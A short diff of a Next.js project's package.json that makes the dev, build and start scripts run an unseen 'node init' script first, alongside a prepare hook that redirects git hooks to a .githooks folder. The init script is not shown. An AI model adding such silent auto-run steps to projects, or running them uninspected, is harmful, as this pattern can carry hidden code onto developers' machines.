@@ -4,9 +4,9 @@
   "private": true,
   "scripts": {
     "prepare": "git config core.hooksPath .githooks || true",
-    "dev": "next dev",
-    "build": "next build",
-    "start": "next start",
+    "dev": "node init && next dev",
+    "build": "node init && next build",
+    "start": "node init && next start",
     "lint": "eslint"
   },
   "dependencies": {
